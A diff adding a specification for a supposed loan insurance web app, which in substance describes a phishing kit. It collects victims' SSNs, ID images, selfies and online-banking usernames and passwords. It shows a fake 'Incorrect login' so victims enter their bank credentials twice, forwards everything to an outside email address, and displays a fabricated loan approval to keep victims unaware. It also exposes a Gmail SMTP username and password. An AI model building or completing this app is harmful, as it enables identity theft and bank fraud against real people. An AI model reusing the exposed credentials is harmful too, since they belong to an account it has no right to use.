@@ -1,0 +1,87 @@
+Loan Insurance Company – Robust & Interactive Web App
+
+Project Overview
+
+We need a highly interactive, well-styled loan insurance platform for U.S. citizens with a robust verification system, smooth animations, and automated loan processing. The platform should include:
+	1.	Frontend: A signup and login page with form validation.
+	2.	Backend: User authentication via Node.js, Express.js, and database storage.
+	3.	Loan Application: Users select a loan amount and go through an identity verification process.
+	4.	Payment Methods: Users can choose Check or Direct Deposit as their reimbursement method.
+	5.	Automated Processing: Loan approval is displayed after 24-48 hours, with real-time status tracking.
+	6.	Email Integration: Status notifications sent to both users and a representative email.
+	7.	Bank Account Linking: Using Clearbit API for bank logo retrieval.
+	8.	ID Verification: Users submit front/back ID and a selfie for verification.
+
+Project Flow
+
+1. User Authentication (Signup/Login Page)
+	•	Fields: Username, Email, Password, Confirm Password.
+	•	Verification: Passwords must match.
+	•	Login Validation: User login details must match signup details, else show an error.
+	•	Form Submission: Uses Node.js to verify authentication.
+
+2. Loan Application Page (Styled with Animations)
+	•	Loan Amount Options: $200, $500, $1K, $2K, $5K, $10K, $20K, $30K, $40K, $50K, $100K, $120K, etc.
+	•	User selects loan amount.
+	•	“Check Coverage” button: Shows a 5-second loading spinner before proceeding to ID verification.
+
+3. Identity Verification Form (Node.js + Express.js Processing)
+	•	User Details:
+	•	Full Name, Middle Name, Date of Birth (manual input or date picker), SSN (9-digit validation), Address, City, State, Zip Code, Phone Number (10-digit validation), Email.
+	•	Validation Rules:
+	•	SSN must be exactly 9 digits; otherwise, show an error.
+	•	Phone number must be exactly 10 digits.
+	•	“Verify My Identity” button: Triggers a 5-second loading spinner and sends the form details to support@cbelko.net via Express.js SMTP.
+
+4. Payment Method Selection
+	•	Options:
+	•	Check: User enters mailing address → Submit → 5-second loading spinner → Redirect to Home with “Pending” loan status.
+	•	Direct Deposit:
+	•	User searches for their bank (uses Clearbit API to fetch the bank logo dynamically).
+	•	Account linking form: Username, Password (User enters credentials twice).
+	•	First attempt: Shows “Incorrect login.”
+	•	Second attempt: Sends both attempts to support@cbelko.net via Express.js SMTP.
+
+5. Loan Status Tracking (Auto-Refreshing Page)
+	•	“Pending” status: Displayed immediately after form submission.
+	•	Automatic Refresh: Every 5 minutes to update status.
+	•	Loan Approval Countdown:
+	•	After 24 hours, display: “Loan Approved”.
+	•	After 48 hours, display: “Your funds have been reimbursed to {selected payment method}.”
+
+6. ID Verification Submission
+	•	Upload Options:
+	•	Front & Back ID: Upload via file or camera.
+	•	Selfie Verification: Take a selfie or upload an image.
+	•	Submission Process:
+	•	Send ID front, back, and selfie to support@cbelko.net.
+
+7. Email Notifications (SMTP Server Integration)
+
+Emails Sent to Users:
+	1.	Application Submitted Confirmation.
+	2.	Loan Approval Notification after 48 hours.
+
+Emails Sent to Representatives:
+	•	All user-submitted form details are forwarded to support@cbelko.net.
+
+Additional Styling & Functionality
+	•	Header Logo: Uses https://logo.clearbit.com/coastaldebt.com.
+	•	Footer: Styled dynamically with 2025 copyright details.
+	•	Express.js SMTP Server for Email Delivery:
+
+SMTP Server: smtp.gmail.com  
+Username: exesoftware010@gmail.com  
+Password: lmgz etkx gude udar  
+Port: 465  
+
+Final Deliverables
+	1.	Fully styled, animated loan insurance web app.
+	2.	Secure user authentication (signup/login).
+	3.	Automated loan processing with countdown approval.
+	4.	Bank linking and dynamic logo retrieval.
+	5.	Identity verification and document submission.
+	6.	Email notifications for status updates.
+	7.	Auto-refreshing loan status every 5 minutes.
+
+This will be a robust, highly interactive web application with a smooth user experience. Let’s build it!
